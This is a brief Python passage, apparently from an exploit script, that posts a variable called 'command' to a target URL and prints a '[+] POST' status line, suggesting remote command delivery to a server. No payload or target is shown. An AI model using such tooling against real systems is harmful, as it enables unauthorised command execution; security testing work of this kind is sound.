try:
    # Send POST request with command in body
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    
    response = requests.post(
        target_url,
        data=command,
        headers=headers,
        timeout=10
    )
    
    print(f"[+] POST {target_url}")
